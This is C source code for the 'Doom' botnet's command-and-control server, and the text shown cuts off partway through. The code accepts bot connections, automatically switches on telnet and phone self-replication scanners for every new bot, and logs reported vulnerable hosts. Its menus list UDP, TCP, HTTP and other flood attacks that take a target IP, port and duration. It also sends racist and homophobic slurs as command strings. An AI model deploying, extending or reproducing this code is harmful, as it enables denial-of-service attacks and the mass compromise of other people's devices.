/*
	d8888b.  .d88b.   .d88b.  .88b  d88. 
	88  `8D .8P  Y8. .8P  Y8. 88'YbdP`88    
	88   88 88    88 88    88 88  88  88    
	88   88 88    88 88    88 88  88  88    
	88  .8D `8b  d8' `8b  d8' 88  88  88   
	Y8888D'  `Y88P'   `Y88P'  YP  YP  YP    BUILD ~ 9
 
Serverside Made by KittyHaxz (Poodle)
People who have made some modifications or gave ideas below
Love
Fyfa
Pices
Zawnix
Ruby
RTO



	ADDITIONS TO SERVERSIDE:
	ATTACK METHODS ADDED ~
		ACK
		TCP
		HUG
		UNKNOWN
		JUNK
		HOLD
		COMBO
		UNK
	ABOUT COMMAND EDITED ~
		ADDED CREDITS TO EVERYONE
	MAIN DOOM COLOR CHANGED
	ADDED RESPONSE TO ~
		!* PHONE ON
		!* SCANNER ON
		!* PHONE OFF
		!* SCANNER OFF
	BLOCKED DUP AND dup FROM SERVERSIDE
	ADDED LINE TO EVERY CLEAR COMMAND~
		$ Type HELP for options $
	ADDED AUTO !* PHONE ON AND !* SCANNER ON FOR EVERY NEW BOT
		                                        clients[infd].connected = 1;
                                        send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
										send(infd, "!* PHONE ON\n", 11, MSG_NOSIGNAL);
	ADDED CRYSTAL CLEAR COMMAND
	MAJOR HELP COMMAND EDITS.
	
 LOGIN FILE = login.txt
 
Color Code
Blue = '\x1b[0;34m'
Brown = '\x1b[0;33m'
Cyan = '\x1b[0;36m' 
DarkGray = '\x1b[1;30m' 
Green = '\x1b[0;32m' 
LightBlue = '\x1b[1;34m' 
LightCyan = '\x1b[1;36m' 
LightGray = '\x1b[0;37m' 
LightGreen = '\x1b[1;32m' 
LightPurple = '\x1b[1;35m' 
LightRed = '\x1b[1;31m' 
Normal = '\x1b[0m' 
Purple = '\x1b[0;35m' 
Red = '\x1b[0;31m' 
White = '\x1b[1;37m' 
Yellow = '\x1b[1;33m

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

#define MAXFDS 1000000

struct account {
    char id[20]; 
    char password[20];
};
static struct account accounts[50]; //max users is set on 50
struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
        int connected;
} managements[MAXFDS];
////////////////////////////////////
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
////////////////////////////////////
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}
static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "STOP USING RELIVANT PORTS\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[31m", 5, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                //printf("sent to fd: %d\n", i);
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[31m~> \x1b[31m", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
                                           //WE ARE MAKING SURE THERE IS NO DUP CLIENTS
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {                  //WE ARE MAKE SURE AGAIN HERE BY SENDING !* LOLNOGTFO|!* GTFOFAG
									            if(send(infd, "!* GTFONIGGER\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
											    if(send(infd, "!* GTFOFAG\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* GTFODUP\n\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* DUPES\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* GTFOPUSSY\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* LOLNOGTFO\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                close(infd);
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
										send(infd, "!* PHONE ON\n", 11, MSG_NOSIGNAL);
										
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) // basic IRC-like ping/pong challenge/response to see if server is alive
                                                {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                        continue;
                                                }
                                                if(strstr(buf, "REPORT ") == buf) // received a report of a vulnerable system from a scan
                                                {
                                                        char *line = strstr(buf, "REPORT ") + 7; 
                                                        fprintf(telFD, "%s\n", line); // let's write it out to disk without checking what it is!
                                                        fflush(telFD);
                                                        TELFound++;
                                                        continue;
                                                }
                                                if(strstr(buf, "PROBING") == buf)
                                                {
                                                        char *line = strstr(buf, "PROBING");
                                                        scannerreport = 1;
                                                        continue;
                                                }
                                                if(strstr(buf, "REMOVING PROBE") == buf)
                                                {
                                                        char *line = strstr(buf, "REMOVING PROBE");
                                                        scannerreport = 0;
                                                        continue;
                                                }
                                                if(strcmp(buf, "PONG") == 0)
                                                {
                                                        continue;
                                                }
 
                                                printf("buf: \"%s\"\n", buf);
                                        }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0; Bots: %d $ Admins: %d %c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 
                sleep(3);
        }
}
int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
 
void *telnetWorker(void *sock)
{
		char usernamez[80];
        int thefd = (int)sock;
		int find_line;
        managesConnected++;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char* username;
        char* password;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);
    
        FILE *fp;
        int i=0;
        int c;
        fp=fopen("login.txt", "r"); 
        while(!feof(fp)) 
		{
				c=fgetc(fp);
				++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
		{
			fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
			++j;
        }
        
        if(send(thefd, "\x1b[31mNickname: \x1b[30m", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
		sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);
        if(strcmp(nickstring, accounts[find_line].id) == 0){	
       	if(send(thefd, "\x1b[31m*           LOADING HAX          *\r\n", 49, MSG_NOSIGNAL) == -1) goto end;	
        if(send(thefd, "\x1b[0m \x1b[30m", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[31m***********************************\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[31m*    This is not a botnet lol     *\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[31m***********************************\r\n", 43, MSG_NOSIGNAL) == -1) goto end;
		    sleep(5);
        goto end;
		fak:

		Title:
		pthread_create(&title, NULL, &titleWriter, sock);
		char ascii_banner_line1 [5000];
		char ascii_banner_line2 [5000];
		char ascii_banner_line3 [5000];
		char ascii_banner_line4 [5000];
		char ascii_banner_line5 [5000];
		char ascii_banner_line6 [5000];
		char ascii_banner_line7 [5000];
		char line1 [80];
		char line2 [80];

	    sprintf(ascii_banner_line1, "\x1b[0;31m           ▓█████▄  ▒█████   ▒█████   ███▄ ▄███▓\r\n");
		sprintf(ascii_banner_line2, "\x1b[0;36m           ▒██▀ ██▌▒██▒  ██▒▒██▒  ██▒▓██▒▀█▀ ██▒\r\n");
		sprintf(ascii_banner_line3, "\x1b[0;36m           ░██   █▌▒██░  ██▒▒██░  ██▒▓██    ▓██░\r\n");
		sprintf(ascii_banner_line4, "\x1b[0;36m           ░██▄  █▌▒██   ██░▒██   ██░▒██    ▒██  \r\n");
		sprintf(ascii_banner_line5, "\x1b[0;36m           ░█████▀ ░ ████▓▒░░ ████▓▒░▒██▒   ░██▒  \r\n");
		sprintf(ascii_banner_line6, "\x1b[0;31m            ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░   ░  ░\r\n");
		sprintf(ascii_banner_line7, "\x1b[0;31m            ░ ▒  ▒   ░ ▒ ▒░   ░ ▒ ▒░ ░  ░      ░\r\n");
        sprintf(line1, "\x1b[0;36m          $ \x1b[37mWelcome %s To The Doom Botnet\x1b[0;36m $\r\n", accounts[find_line].id, buf);
		sprintf(line2, "\x1b[0;31m $ \x1b[0;37mType Help for your options \x1b[0;31m$\r\n");
		
		if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2, strlen(line2), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		if(send(thefd, "\x1b[0;31m~> \x1b[0;31m", 13, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
		
		if(strstr(buf, "!* PHONE ON")) 
        {
          sprintf(botnet, "PHONE SCANNER STARTED\r\n", TELFound, scannerreport);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	    }  
		
		if(strstr(buf, "!* PHONE OFF")) 
        {
          sprintf(botnet, "PHONE SCANNER STOPPED\r\n", TELFound, scannerreport);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	    }  

	    if(strstr(buf, "BOTS"))
		{  
		sprintf(botnet, "[+] Boats Connected: %d [-] Boatnet Captians Online: %d [+]\r\n", clientsConnected(), managesConnected);
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		
	    if(strstr(buf, "ABOUT"))
		{  
		sprintf(botnet, "DOOM SERVERSIDE. Created by KittyHaxz (Poodle) Along side, zawnix, love, pices, fyfa, ruby, RTO\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }	 

        if(strstr(buf, "bots"))
		{  
	    sprintf(botnet, "[+] Boats Connected: %d [-] Boatnet Captians Online: %d [+]\r\n", clientsConnected(), managesConnected);
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
	    if(strstr(buf, "!* SCANNER OFF"))
		{  
		sprintf(botnet, "TELNET SCANNER STOPPED\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* TCP"))
		{  
		sprintf(botnet, "Succesfully Sent A TCP FLOOD\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* UDP"))
		{  
		sprintf(botnet, "Succesfully Sent A UDP FLOOD\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* STD"))
		{  
		sprintf(botnet, "STD Flood Sent to Skid\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* CNC"))
		{  
		sprintf(botnet, "CNC Flooding dat boatnet\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* HTTP"))
		{  
		sprintf(botnet, "Succesfully Sent A HTTP FLOOD\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	    if(strstr(buf, "!* SCANNER ON"))
		{  
		sprintf(botnet, "TELNET SCANNER STARTED\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
			    if(strstr(buf, "!* SCANNER OFF"))
		{  
		sprintf(botnet, "TELNET SCANNER STOPPED\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "HELP")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char helpline1  [80];
				char helpline2  [80];
				char helpline3  [80];
				char helpline4  [80];

				sprintf(helpline1,  "\x1b[0;31mType A Option From Below:\r\n");
				sprintf(helpline2,  "\x1b[1;37m[\x1b[35mDDOS\x1b[1;37m] ~ DDOS Commands\r\n");
				sprintf(helpline3,  "\x1b[1;37m[\x1b[34mEXTRA\x1b[1;37m] ~ Extra Lit Commands\r\n");
				sprintf(helpline4,  "\x1b[1;37m[\x1b[0;33mSELFREP\x1b[1;37m] ~ DONT FUCKING TOUCH THIS SHIT\r\n");;

				if(send(thefd, helpline1,  strlen(helpline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, helpline2,  strlen(helpline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, helpline3,  strlen(helpline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, helpline4,  strlen(helpline4),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[1;31m~$ \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
		}
					if(strstr(buf, "DDOS")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char ddosline1  [80];
				char ddosline2  [80];
				char ddosline3  [80];
				char ddosline4  [80];
				char ddosline5  [80];
				char ddosline6  [80];
				char ddosline7  [80];
				char ddosline8  [80];
				char ddosline9  [80];
				char ddosline10  [80];
				char ddosline11  [80];
				char ddosline12  [80];

				sprintf(ddosline1, "\x1b[31m\x1b[35m !* UDP [IP] [PORT] [TIME] 32 1337 400 | UDP FLOOD\r\n");
				sprintf(ddosline2, "\x1b[31m\x1b[35m !* STD [IP] [PORT] [TIME] | STD FLOOD\r\n");
				sprintf(ddosline3, "\x1b[35m\x1b[35m !* TCP [IP] [PORT] [TIME] 32 all 1337 400| TCP FLOOD\r\n");
				sprintf(ddosline4, "\x1b[35m\x1b[35m !* UDP [IP] [PORT] [TIME] 32 ack 1337 400 | ACK FLOOD\r\n");
				sprintf(ddosline5, "\x1b[35m\x1b[35m !* JUNK [IP] [PORT] [TIME] | JUNK FLOOD\r\n");
				sprintf(ddosline6, "\x1b[35m\x1b[35m !* HOLD [IP] [PORT] [TIME] | HOLD FLOOD\r\n");
				sprintf(ddosline7, "\x1b[35m\x1b[35m !* COMBO [IP] [PORT] [TIME] | COMBO FLOOD HOLD AND JUNK\r\n");
				sprintf(ddosline8, "\x1b[35m\x1b[35m !* HUG [IP] [PORT] [TIME] | HUG FLOOD\r\n");
				sprintf(ddosline9, "\x1b[35m\x1b[35m !* UKN [IP] [PORT] [TIME] | UNK FLOOD\r\n");
				sprintf(ddosline10, "\x1b[35m\x1b[35m !* CNC [IP] [ADMIN-PORT] [TIME] | CNC FLOOD\r\n");
				sprintf(ddosline11, "\x1b[35m\x1b[35m !* UNKNOWN [IP] [TIME] [PORT] | UNK FLOOD FLOOD\r\n");
				sprintf(ddosline12, "\x1b[35m\x1b[35m !* KILLATTK | KILLS ALL ATTACKS\r\n");

				if(send(thefd, ddosline1,  strlen(ddosline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline2,  strlen(ddosline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline3,  strlen(ddosline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline4,  strlen(ddosline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline5,  strlen(ddosline5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline6,  strlen(ddosline6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline7,  strlen(ddosline7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline8,  strlen(ddosline8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline9,  strlen(ddosline9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline10,  strlen(ddosline10),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline11,  strlen(ddosline11),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline12,  strlen(ddosline12),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[1;31m~$ \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "SELFREP")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char repline1  [80];
				char repline2  [80];
				char repline3  [80];
				char repline4  [80];
				char repline5  [80];
				char repline6  [80];
				
				sprintf(repline1,  "\x1b[31m !* PHONE ON | TURNS ON PHONE SELF REPLIFICATION\r\n");
				sprintf(repline2,  "\x1b[35m !* SCANNER ON | TURNS ON TELNET SELF REPLIFICATION\r\n");
				sprintf(repline3,  "\x1b[31m !* PHONE OFF | TURNS OFF PHONE SELF REPLIFICATION\r\n");
				sprintf(repline4,  "\x1b[35m !* SCANNER OFF | TURNS OFF TELNET SELF REPLIFICATION\r\n");
				sprintf(repline5,  "\x1b[31m !* wget.py | SCANS sithbots.txt PYTHON LIST\r\n");
				sprintf(repline6,  "\x1b[35m !* PYTHON OFF | TURNS OFF PYTHON SCANNER\r\n");

				if(send(thefd, repline1,  strlen(repline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline2,  strlen(repline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline3,  strlen(repline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline4,  strlen(repline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline5,  strlen(repline5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline6,  strlen(repline6),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[1;31m~$ \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "EXTRA")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char extraline1  [80];
				char extraline2  [80];
				char extraline3  [80];
				char extraline4  [80];
				char extraline5  [80];
				char extraline6  [80];
				char extraline7  [80];

				sprintf(extraline1,  "\x1b[35m PORTS | PORTS TO HIT WITH DUH\r\n");
				sprintf(extraline2,  "\x1b[31m BOTS | BOT COUNT DUH\r\n");
				sprintf(extraline3,  "\x1b[35m CLEAR | CLEARS SCREEN DUH\r\n");
				sprintf(extraline4,  "\x1b[35m CLEAR_LIT | LIT DOOM\r\n");
				sprintf(extraline5,  "\x1b[35m CLEAR_RASTA | RASTA DOOM\r\n");
				sprintf(extraline6,  "\x1b[35m CLEAR_SMALL | SMALL DOOM\r\n");
				sprintf(extraline7,  "\x1b[35m CRYSTAL | MADE FOR KITTYS GIRL aka CRYSTAL\r\n");

				if(send(thefd, extraline1,  strlen(extraline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, extraline2,  strlen(extraline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, extraline3,  strlen(extraline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, extraline4,  strlen(extraline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, extraline5,  strlen(extraline5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, extraline6,  strlen(extraline6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, extraline7,  strlen(extraline7),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[1;31m~$ \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
	    if(strstr(buf, "CLEAR")){

        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2, strlen(line2), MSG_NOSIGNAL) == -1) goto end;
        managements[thefd].connected = 1;
     	}
	    if(strstr(buf, "clear")){
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2, strlen(line2), MSG_NOSIGNAL) == -1) goto end;
        managements[thefd].connected = 1;
		}

		if(strstr(buf, "CRYSTAL")){
		   
		char ascii_banner_line10 [5000];
		char ascii_banner_line11 [5000];
		char ascii_banner_line12 [5000];
		char ascii_banner_line13 [5000];
		char ascii_banner_line14 [5000];
		char ascii_banner_line15 [5000];
		char ascii_banner_line16 [5000];
		char crystal1 [80];
		char crystal2 [80];
    
       	sprintf(ascii_banner_line10, "\x1b[1;36m         ██████╗██████╗ ██╗   ██╗███████╗████████╗ █████╗ ██╗     \r\n");
		sprintf(ascii_banner_line11, "\x1b[0;36m        ██╔════╝██╔══██╗╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔══██╗██║     \r\n");
		sprintf(ascii_banner_line12, "\x1b[0;36m        ██║     ██████╔╝ ╚████╔╝ ███████╗   ██║   ███████║██║     \r\n");
		sprintf(ascii_banner_line13, "\x1b[0;36m        ██║     ██╔══██╗  ╚██╔╝  ╚════██║   ██║   ██╔══██║██║     \r\n");
		sprintf(ascii_banner_line14, "\x1b[0;36m        ╚██████╗██║  ██║   ██║   ███████║   ██║   ██║  ██║███████╗\r\n");
